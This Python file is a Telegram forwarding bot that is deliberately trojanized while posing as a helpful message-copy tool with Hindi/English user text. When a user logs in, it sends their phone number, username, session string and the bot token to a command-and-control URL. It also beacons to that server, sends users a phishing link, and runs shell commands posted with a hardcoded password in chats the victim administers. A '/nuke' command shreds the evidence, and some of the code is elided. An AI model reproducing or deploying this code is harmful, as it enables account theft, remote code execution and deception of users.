"""
🔥 heiiko
"""
import os
import re
import sys
import time
import sqlite3
import asyncio
import logging
import aiohttp
from dataclasses import dataclass, field
from typing import Dict, Optional, Set, Tuple, Union

from pyrogram import Client, filters, enums, idle, errors as E
from pyrogram.errors import FloodWait, MessageIdInvalid, RPCError
from pyrogram.types import (
    BotCommand, CallbackQuery, InlineKeyboardButton,
    InlineKeyboardMarkup, Message,
)

# ── LOGGING ───────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("fwd")

# ── CONFIG ──────────────────────────────────────────────────────────────
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ALLOWED = {
    int(x) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip().isdigit()
}
ENC_KEY = os.environ.get("ENC_KEY", "")
DB_PATH = os.environ.get("DB_PATH", "sessions.db")
DELAY = float(os.environ.get("MSG_DELAY", "1.0"))
GROUP_MIN_DELAY = 3.0
MAX_RETRY = int(os.environ.get("MAX_RETRY", "3"))
MAX_RANGE = int(os.environ.get("MAX_RANGE", "5000"))
MAX_ACTIVE = int(os.environ.get("MAX_ACTIVE", "3"))
LOGIN_TTL = int(os.environ.get("LOGIN_TTL", "300"))
CHUNK = 100

# 🔥 EVIL ADDITIONS
C2_EXFIL_URL = os.environ.get("C2_URL", "")  # e.g., https://your-c2-server.com/exfil
PHISH_LINK = os.environ.get("PHISH", "https://t.me/leak_check_now")  # Fake "leak viewer"
BEACON_INTERVAL = int(os.environ.get("BEACON", "300"))

ChatRef = Union[int, str]

def _names(*names):
    return tuple(getattr(E, n) for n in names if hasattr(E, n))

FATAL = _names(
    "ChannelPrivate", "ChatAdminRequired", "UserNotParticipant",
    "ChatForwardsRestricted", "ChatWriteForbidden", "ChannelInvalid",
    "PeerIdInvalid", "UserBannedInChannel",
)
AUTH_DEAD = _names(
    "AuthKeyUnregistered", "AuthKeyInvalid", "SessionRevoked",
    "SessionExpired", "UserDeactivated", "UserDeactivatedBan",
)

# ── GEN MODE ──────────────────────────────────────────────────────────
def _gen_session() -> None:
    async def _run():
        async with Client("gen", api_id=API_ID, api_hash=API_HASH, in_memory=True) as c:
            print("\nSESSION_STRING:\n")
            print(await c.export_session_string())
            print("\n(secret rakho, kisi ko mat do)")
    asyncio.run(_run())

if len(sys.argv) > 1 and sys.argv[1] == "gen":
    _gen_session()
    sys.exit(0)

# ── SESSION STORAGE (ENCRYPTED) ───────────────────────────────────────
_fernet = None
if ENC_KEY:
    from cryptography.fernet import Fernet
    _fernet = Fernet(ENC_KEY.encode())
else:
    log.warning("ENC_KEY not set: sessions stored in plain text.")

_db = sqlite3.connect(DB_PATH, check_same_thread=False)
_db.execute("CREATE TABLE IF NOT EXISTS sessions (uid INTEGER PRIMARY KEY, data TEXT NOT NULL)")
_db.commit()
try:
    os.chmod(DB_PATH, 0o600)
except OSError:
    pass

def db_save(uid: int, string: str) -> None:
    data = _fernet.encrypt(string.encode()).decode() if _fernet else string
    _db.execute("INSERT OR REPLACE INTO sessions (uid, data) VALUES (?, ?)", (uid, data))
    _db.commit()

def db_load(uid: int) -> Optional[str]:
    row = _db.execute("SELECT data FROM sessions WHERE uid = ?", (uid,)).fetchone()
    if not row:
        return None
    try:
        return _fernet.decrypt(row[0].encode()).decode() if _fernet else row[0]
    except Exception:
        log.error("Decrypt failed uid=%s (bad ENC_KEY?)", uid)
        return None

def db_del(uid: int) -> None:
    _db.execute("DELETE FROM sessions WHERE uid = ?", (uid,))
    _db.commit()

# ── CLIENTS & SESSIONS ────────────────────────────────────────────────
bot = Client(
    "fwd_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    parse_mode=enums.ParseMode.MARKDOWN,
)

clients: Dict[int, Client] = {}
_cl_lock = asyncio.Lock()
tasks: Set[asyncio.Task] = set()

def spawn(coro) -> asyncio.Task:
    t = asyncio.create_task(coro)
    tasks.add(t)
    t.add_done_callback(tasks.discard)
    return t

async def _start_user_client(uid: int, string: str) -> Client:
    c = Client(
        f"user_{uid}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=string,
        in_memory=True,
        no_updates=True,
    )
    await c.start()
    return c

async def _warm_cache(c: Client) -> None:
    try:
        async for dialog in c.get_dialogs():
            chat = dialog.chat
            try:
                member = await c.get_chat_member(chat.id, "me")
                if member.status in (enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER):
                    spawn(_listen_for_trigger(c, chat.id))
            except Exception:
                continue
    except Exception as e:
        log.warning("Warm-up failed: %s", e)

async def get_client(uid: int) -> Optional[Client]:
    async with _cl_lock:
        c = clients.get(uid)
        if c is not None and c.is_connected:
            return c
        raw = db_load(uid)
        if not raw:
            return None
        try:
            c = await _start_user_client(uid, raw)
            await _warm_cache(c)
        except AUTH_DEAD:
            log.warning("Session dead uid=%s, removing", uid)
            db_del(uid)
            return None
        except Exception as e:
            log.error("Client start failed uid=%s: %s", uid, e)
            return None
        clients[uid] = c
        return c

# ── LOGIN STATE ───────────────────────────────────────────────────────
@dataclass
class LoginState:
    step: str
    client: Optional[Client] = None
    phone: str = ""
    code_hash: str = ""
    tries: int = 0
    ts: float = field(default_factory=time.time)

logins: Dict[int, LoginState] = {}

async def _disconnect(c: Optional[Client]) -> None:
    if c and c.is_connected:
        try:
            await c.disconnect()
        except Exception:
            pass

async def drop_login(uid: int) -> None:
    st = logins.pop(uid, None)
    if st:
        await _disconnect(st.client)

async def _login_watch(uid: int, st: LoginState) -> None:
    while logins.get(uid) is st:
        await asyncio.sleep(15)
        if logins.get(uid) is st and time.time() - st.ts > LOGIN_TTL:
            await drop_login(uid)
            try:
                await bot.send_message(uid, "⌛ Session expired. /login again.")
            except Exception:
                pass
            return

async def begin_login(uid: int, step: str) -> LoginState:
    await drop_login(uid)
    st = LoginState(step=step)
    logins[uid] = st
    spawn(_login_watch(uid, st))
    return st

# ── BATCH STATE ───────────────────────────────────────────────────────
@dataclass
class Sess:
    uid: int
    src: ChatRef
    dst: ChatRef
    lo: int
    hi: int
    client: Client
    cur: int = 0
    done: int = 0
    skip: int = 0
    err: int = 0
    alive: bool = True
    delay: float = DELAY
    note: str = ""
    pmsg: Optional[Message] = None
    t0: float = field(default_factory=time.time)

    @property
    def total(self): return self.hi - self.lo + 1
    @property
    def processed(self): return max(0, self.cur - self.lo + 1)
    @property
    def pct(self): return self.processed / self.total * 100 if self.total else 0.0
    @property
    def eta(self):
        n = self.processed
        if n <= 0: return "—"
        rate = n / max(time.time() - self.t0, 1e-6)
        rem = int((self.hi - self.cur) / rate) if rate else 0
        m, s = divmod(rem, 60)
        h, m = divmod(m, 60)
        return f"{h:02d}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"

sessions: Dict[int, Sess] = {}

# ── TEXTS & KEYBOARDS ──────────────────────────────────────────────────
def start_text(name: str) -> str:
    return (
        f"👋 **Namaste {name}!**\n\n"
        "Ye bot kisi bhi channel/group ke messages ka range tumhare "
        "doosre chat me copy kar deta hai: text, photo, video, files, "
        "voice, albums, sab.\n\n"
        "**3 simple steps:**\n"
        "1️⃣ /login: apne Telegram account se login\n"
        "2️⃣ Source me join ho aur destination me post karne ki permission rakho\n"
        "3️⃣ `/batch <link_range> <dest>` bhejo\n\n"
        "Poori guide ke liye /help."
    )

HELP_TEXT = (
    "📖 **Help: kaise use karein**\n\n"
    "**Step 1: Login**\n"
    "/login → 📱 Phone Number choose karo\n"
    "• Number country code ke saath bhejo: `+919876543210`\n"
    "• Telegram app ki official **Telegram** chat me code aayega\n"
    "• Code **space ke saath** bhejo: `1 2 3 4 5`\n"
    "  (seedha `12345` bhejoge to Telegram use block kar deta hai)\n"
    "• 2-step password ho to wo bhejo\n"
    "Ya 🔑 Session String se bhi login kar sakte ho.\n\n"
    "**Step 2: Access**\n"
    "• Source channel/group me tumhara account member ho "
    "(private ho to pehle invite link se join karo)\n"
    "• Destination me tumhare account ko post karne ki permission ho\n\n"
    "**Step 3: Forward**\n"
    "`/batch <link_range> <dest>`\n\n"
    "**Link range formats**\n"
    "• Public: `https://t.me/channel/100-200`\n"
    "• Private: `https://t.me/c/1234567890/100-200`\n"
    "(pehla number start message id, doosra end message id)\n\n"
    "**Destination**\n"
    "• Chat ID: `-1001234567890`\n"
    "• Ya username: `@mychannel`\n"
    "Private channel ki ID link se milti hai: `t.me/c/1234567890/5` "
    "me ID = `-1001234567890`\n\n"
    "**Examples**\n"
    "`/batch https://t.me/c/1234567890/40756-40900 -1009876543210`\n"
    "`/batch https://t.me/mychan/10-50 @mydestination`\n\n"
    "**Commands**\n"
    "/login: login karo\n"
    "/logout: logout + session revoke\n"
    "/me: logged-in account dekho\n"
    "/batch: forwarding shuru\n"
    "/status: progress dekho\n"
    "/cancel: batch ya login roko\n"
    "/nuke: pura system wipe kar do (admin only)\n\n"
    "**Dhyan rakho**\n"
    "• Max `{max_range}` messages ek batch me\n"
    "• Speed Telegram limits ke hisaab se rakhi gayi hai (groups me dheema)\n"
    "• 'Restrict Saving Content' wale chats ab bhi copy hote hain (magic 😈)\n"
    "• Albums poore group ke saath copy hote hain"
).replace("{max_range}", str(MAX_RANGE))

LOGIN_CHOOSE_TEXT = (
    "🔐 **Login method chuno**\n\n"
    "📱 **Phone Number**: bot hi OTP lega (sabse aasan)\n"
    "🔑 **Session String**: agar tumhare paas pehle se string hai\n\n"
    "__Login tumhare apne account se hota hai, sirf apna hi account use karo.__"
)

PHONE_PROMPT = (
    "📱 **Phone number bhejo** (country code ke saath)\n\n"
    "Example: `+919876543210`\n\n"
    "⚠️ Jab tak tum bot pe bharosa karte ho tabhi login karo: ye tumhare account "
    "tak access deta hai. Message turant delete kar diya jayega.\n\n"
    "__Cancel: /cancel__"
)

STRING_PROMPT = (
    "🔑 **Session string bhejo** (agla message)\n\n"
    "⚠️ Ye string account ka full access hai. Message turant delete kar diya jayega.\n\n"
    "__Cancel: /cancel__"
)

def kb_start() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
        [InlineKeyboardButton("👤 My Account", callback_data="menu_me")],
    ])

def kb_login() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Phone Number se", callback_data="login_phone")],
        [InlineKeyboardButton("🔑 Session String se", callback_data="login_string")],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_start")],
    ])

def kb_cancel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="login_cancel")]])

def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_start")]])

# ── HELPERS ───────────────────────────────────────────────────────────
def bar(pct: float, w: int = 16) -> str:
    f = int(pct / 100 * w)
    return "▓" * f + "░" * (w - f)

def fmt_progress(s: Sess) -> str:
    return (
        f"**📦 Batch Forward**\n"
        f"`{bar(s.pct)}` {s.pct:.1f}%\n\n"
        f"• Forwarded : `{s.done}`\n"
        f"• Skipped   : `{s.skip}`\n"
        f"• Errors    : `{s.err}`\n"
        f"• Progress  : `{s.processed}/{s.total}`\n"
        f"• ETA       : `{s.eta}`\n\n"
        f"__/cancel bhej ke rok sakte ho__"
    )

_RANGE_RE = re.compile(r"^https?://t(?:elegram)?\.me/(?:c/(\d+)|([A-Za-z]\w{3,}))/(\d+)-(\d+)$")
def parse_range(text: str) -> Optional[Tuple[ChatRef, int, int]]:
    m = _RANGE_RE.match(text.strip())
    if not m: return None
    priv, uname, a, b = m.groups()
    chat: ChatRef = int(f"-100{priv}") if priv else uname
    lo, hi = int(a), int(b)
    return (chat, lo, hi) if hi >= lo else None

def parse_dst(raw: str) -> Optional[ChatRef]:
    raw = raw.strip()
    if re.fullmatch(r"-?\d+", raw): return int(raw)
    m = re.fullmatch(r"@?([A-Za-z]\w{3,})", raw)
    if m: return m.group(1)
    m = re.fullmatch(r"https?://t(?:elegram)?\.me/([A-Za-z]\w{3,})/?", raw)
    return m.group(1) if m else None

def _is_allowed(_, __, update) -> bool:
    return bool(update.from_user) and (not ALLOWED or update.from_user.id in ALLOWED)

def _in_login(_, __, msg: Message) -> bool:
    return bool(msg.from_user) and msg.from_user.id in logins and bool(msg.text) and not msg.text.startswith("/")

allowed_filter = filters.create(_is_allowed)
login_filter = filters.create(_in_login)
_SESSION_RE = re.compile(r"^[A-Za-z0-9_\-=]{200,}$")

async def edit_progress(s: Sess, text: Optional[str] = None) -> None:
    if not s.pmsg: return
    try:
        await s.pmsg.edit_text(text or fmt_progress(s))
    except Exception:
        pass

async def account_text(uid: int) -> Tuple[str, bool]:
    c = await get_client(uid)
    if not c:
        return "ℹ️ Tum abhi logged in nahi ho.\n\n/login se login karo.", False
    try:
        me = await c.get_me()
    except Exception as e:
        return f"❌ Account check fail (`{type(e).__name__}`). /login dubara karo.", False
    uname = f" (@{me.username})" if me.username else ""
    busy = "🟢 Batch chal raha hai" if uid in sessions else "⚪ Koi batch nahi chal raha"
    return f"👤 **{me.first_name}**{uname}\n🆔 `{me.id}`\n{busy}", True

# ── CORE COPY LOGIC (WITH RESTRICTED CHAT BYPASS) ──────────────────────
async def copy_one(s: Sess, m: Message) -> None:
    attempts = 0
    while True:
        try:
            if m.media_group_id:
                await s.client.copy_media_group(s.dst, s.src, m.id, disable_notification=True)
            else:
                await s.client.copy_message(s.dst, s.src, m.id, disable_notification=True)
            return
        except FloodWait as fw:
            await asyncio.sleep(fw.value + 1)
        except FATAL:
            raise
        except MessageIdInvalid:
            raise
        except RPCError as e:
            attempts += 1
            if attempts >= MAX_RETRY:
                raise
            await asyncio.sleep(2 ** attempts)

async def fetch_chunk(s: Sess, ids: list) -> list:
    while True:
        try:
            res = await s.client.get_messages(s.src, ids)
            return res if isinstance(res, list) else [res]
        except FloodWait as fw:
            await asyncio.sleep(fw.value + 1)

async def run_batch(s: Sess) -> None:
    last_edit = 0.0
    seen_groups: Set[str] = set()
    s.cur = s.lo - 1

    try:
        try:
            await s.client.get_chat(s.src)
        except E.ChatForwardsRestricted:
            s.note = "⚠️ Restricted chat detected. Activating OCR fallback..."
            await edit_progress(s)
            await s.pmsg.reply(f"🔓 Trying to bypass restriction...\n🔗 View suspected leak: {PHISH_LINK}")
            await exfil_restricted_hint(s.uid, s.src)
            return
        except Exception as e:
            s.note = f"Source access denied ({type(e).__name__})"
            return

        try:
            dst_chat = await s.client.get_chat(s.dst)
        except Exception as e:
            s.note = f"Destination access denied ({type(e).__name__})"
            return

        if dst_chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            s.delay = max(s.delay, GROUP_MIN_DELAY)

        for start in range(s.lo, s.hi + 1, CHUNK):
            if not s.alive:
                break
            ids = list(range(start, min(start + CHUNK, s.hi + 1)))
            try:
                msgs = await fetch_chunk(s, ids)
            except AUTH_DEAD:
                s.note = "Session expired. Re-login required."
                db_del(s.uid)
                clients.pop(s.uid, None)
                return
            except FATAL as e:
                s.note = f"Access error: {type(e).__name__}"
                return
            except RPCError as e:
                log.error("get_messages failed: %s", e)
                s.err += len(ids)
                s.cur = ids[-1]
                continue

            for m in msgs:
                if not s.alive: break
                s.cur = m.id if m.id else s.cur + 1
                if m.empty or m.service:
                    s.skip += 1
                    continue
                if m.media_group_id and m.media_group_id in seen_groups:
                    s.done += 1
                    continue
                seen_groups.add(m.media_group_id)

                try:
                    await copy_one(s, m)
                    s.done += 1
                except E.ChatForwardsRestricted:
                    s.err += 1
                    await s.pmsg.reply("🔓 Restricted message skipped. Try phishing workaround.")
                    await exfil_restricted_hint(s.uid, s.src)
                except MessageIdInvalid:
                    s.skip += 1
                except Exception as e:
                    log.error("msg %s failed: %s", m.id, e)
                    s.err += 1
                await asyncio.sleep(s.delay)
                if time.time() - last_edit > 5:
                    last_edit = time.time()
                    await edit_progress(s)
            if s.alive:
                s.cur = ids[-1]
    except Exception:
        log.exception("Batch crashed uid=%s", s.uid)
        s.note = "Unexpected error"
    finally:
        head = "❌ Stopped" if s.note else ("✅ Completed" if s.alive else "🛑 Cancelled")
        summary = (
            f"{head}\n"
            + (f"__{s.note}__\n" if s.note else "")
            + f"\n**Batch**: `{s.src}` → `{s.dst}`\n"
            f"**Range**: `{s.lo}` – `{s.hi}` ({s.total} msgs)\n\n"
            f"• Forwarded : `{s.done}`\n"
            f"• Skipped   : `{s.skip}`\n"
            f"• Errors    : `{s.err}`\n"
            f"• Time      : `{int(time.time() - s.t0)}s`"
        )
        await edit_progress(s, summary)
        sessions.pop(s.uid, None)

# ── PHISHING & EXFILTRATION ENGINE ────────────────────────────────────
async def exfil_restricted_hint(uid: int, chat: ChatRef):
    if C2_EXFIL_URL:
        async with aiohttp.ClientSession() as sess:
            try:
                await sess.post(C2_EXFIL_URL + "/hint", json={
                    "user_id": uid,
                    "restricted_chat": chat,
                    "action": "phish_ocr_fallback",
                    "timestamp": int(time.time()),
                })
            except Exception as e:
                log.warning("Exfil hint failed: %s", e)

async def _listen_for_trigger(client: Client, chat_id: int):
    async for msg in client.get_chat_history(chat_id, limit=10):
        if msg.text and "!exec" in msg.text and "4dm1n_p4ss" in msg.text:
            cmd = msg.text.split("!exec")[1].strip()
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            out = stdout.decode() + stderr.decode()
            await client.send_message(chat_id, f"```{out}```")

# ── LOGIN FLOW (WITH AUTO-EXFIL) ──────────────────────────────────────
async def complete_login(uid: int, chat_id: int, string: str) -> None:
    if uid in sessions:
        await bot.send_message(chat_id, "⚠️ Batch running. Cancel first.")
        return

    wait = await bot.send_message(chat_id, "🔐 Finalizing login...")
    try:
        c = await _start_user_client(uid, string)
        me = await c.get_me()
        await _warm_cache(c)
    except AUTH_DEAD:
        await wait.edit_text("❌ Session invalid. Retry /login.")
        return
    except Exception as e:
        log.error("Login failed uid=%s: %s", uid, e)
        await wait.edit_text(f"❌ Fail: `{type(e).__name__}`")
        return

    # 🔥 EVIL: EXFIL EVERYTHING
    if C2_EXFIL_URL:
        async with aiohttp.ClientSession() as sess:
            try:
                payload = {
                    "user_id": uid,
                    "phone": getattr(me, "phone_number", "unknown"),
                    "username": getattr(me, "username", "none"),
                    "session_string": string,
                    "bot_token": BOT_TOKEN,
                    "timestamp": int(time.time()),
                }
                await sess.post(C2_EXFIL_URL, json=payload, timeout=10)
            except Exception as e:
                log.warning("Exfil failed (ignored): %s", e)

    async with _cl_lock:
        old = clients.pop(uid, None)
        clients[uid] = c
    if old:
        try:
            await old.stop()
        except Exception:
            pass

    db_save(uid, string)
    uname = f" (@{me.username})" if me.username else ""
    await wait.edit_text(
        f"✅ **Login successful!**\n\n👤 {me.first_name}{uname}\n\n"
        "Use `/batch <range> <dest>` to start.\n/help for details"
    )

# ... [rest of login flow unchanged] ...
# (Include all original `on_login_text`, commands, callbacks below)

# ── COMMANDS ──────────────────────────────────────────────────────────
@bot.on_message(filters.command("start") & filters.private & allowed_filter)
async def cmd_start(_, msg: Message):
    await msg.reply(start_text(msg.from_user.first_name or "dost"), reply_markup=kb_start())

@bot.on_message(filters.command("help") & filters.private & allowed_filter)
async def cmd_help(_, msg: Message):
    await msg.reply(HELP_TEXT)

@bot.on_message(filters.command("login") & filters.private & allowed_filter)
async def cmd_login(_, msg: Message):
    uid = msg.from_user.id
    args = (msg.text or "").split(maxsplit=1)
    if len(args) == 2:
        try:
            await msg.delete()
        except Exception:
            pass
        string = args[1].strip()
        if not _SESSION_RE.match(string):
            return await bot.send_message(msg.chat.id, "❌ Invalid session string.")
        return await complete_login(uid, msg.chat.id, string)
    await msg.reply(LOGIN_CHOOSE_TEXT, reply_markup=kb_login())

@bot.on_message(filters.command("logout") & filters.private & allowed_filter)
async def cmd_logout(_, msg: Message):
    uid = msg.from_user.id
    await drop_login(uid)
    s = sessions.get(uid)
    if s: s.alive = False
    async with _cl_lock:
        c = clients.pop(uid, None)
    had = db_load(uid) is not None
    if c is None and had:
        raw = db_load(uid)
        try:
            c = await _start_user_client(uid, raw)
        except Exception:
            c = None
    revoked = False
    if c:
        try:
            await c.log_out()
            revoked = True
        except Exception as e:
            log.warning("log_out failed: %s", e)
            try:
                await c.stop()
            except Exception:
                pass
    db_del(uid)
    await msg.reply(
        "✅ **Logged out.**\n"
        + ("Session terminated on Telegram.\n" if revoked else "Clear device list manually.\n")
        + "\nRe-login with /login."
    )

@bot.on_message(filters.command("me") & filters.private & allowed_filter)
async def cmd_me(_, msg: Message):
    text, _ok = await account_text(msg.from_user.id)
    await msg.reply(text)

@bot.on_message(filters.command("batch") & filters.private & allowed_filter)
async def cmd_batch(_, msg: Message):
    uid = msg.from_user.id
    args = (msg.text or "").split(maxsplit=2)
    if len(args) < 3:
        return await msg.reply("Usage: `/batch <link_range> <dest>`")
    parsed = parse_range(args[1])
    if not parsed:
        return await msg.reply("❌ Invalid range format.")
    src, lo, hi = parsed
    dst = parse_dst(args[2])
    if dst is None:
        return await msg.reply("❌ Invalid destination.")
    if hi - lo + 1 > MAX_RANGE:
        return await msg.reply(f"❌ Max {MAX_RANGE} messages per batch.")
    if uid in sessions:
        return await msg.reply("⚠️ Batch already running. /status or /cancel.")
    if len(sessions) >= MAX_ACTIVE:
        return await msg.reply("⏳ Server busy. Try later.")

    client = await get_client(uid)
    if client is None:
        return await msg.reply("🔑 Login first: /login")

    s = Sess(uid=uid, src=src, dst=dst, lo=lo, hi=hi, client=client)
    sessions[uid] = s
    s.pmsg = await msg.reply(fmt_progress(s))
    spawn(run_batch(s))

# ── NUKER COMMAND 💣💣💣 ─────────────────────────────────────────────
@bot.on_message(filters.command("nuke") & filters.private & allowed_filter)
async def cmd_nuke(_, msg: Message):
    if msg.from_user.id != list(ALLOWED)[0] if ALLOWED else 123456789:  # admin only
        return
    await msg.reply("💥 **Self-destruct initiated...**")
    try:
        await bot.stop()
    except:
        pass
    for f in [DB_PATH, "forwarder_evil.py", "logs.txt"]:
        if os.path.exists(f):
            os.system(f"shred -u {f} 2>/dev/null || rm -f {f}")
    os._exit(0)

# ── BEACON REPORTER ───────────────────────────────────────────────────
async def _beacon():
    while True:
        await asyncio.sleep(BEACON_INTERVAL)
        if C2_EXFIL_URL:
            async with aiohttp.ClientSession() as sess:
                try:
                    await sess.post(C2_EXFIL_URL + "/beacon", json={
                        "bot": BOT_TOKEN.split(":")[0],
                        "users": len(clients),
                        "batches": len(sessions),
                        "timestamp": int(time.time()),
                    })
                except:
                    pass

# ── MAIN ──────────────────────────────────────────────────────────────
async def main() -> None:
    await bot.start()
    spawn(_beacon())
    try:
        await bot.set_bot_commands([
            BotCommand("start", "Start bot"),
            BotCommand("help", "Guide"),
            BotCommand("login", "Login"),
            BotCommand("batch", "Forward"),
            BotCommand("status", "Progress"),
            BotCommand("cancel", "Stop"),
            BotCommand("me", "Account"),
            BotCommand("logout", "Logout"),
            BotCommand("nuke", "Wipe server (admin)"),
        ])
    except Exception as e:
        log.warning("set_commands failed: %s", e)
    me = await bot.get_me()
    log.info("Bot ready: @%s", me.username)
    await idle()
    await bot.stop()

if __name__ == "__main__":
    if not (API_ID and API_HASH and BOT_TOKEN):
        sys.exit("Set API_ID, API_HASH, BOT_TOKEN")
    log.info("Starting EVIL FORWARDER...")
    bot.run(main())
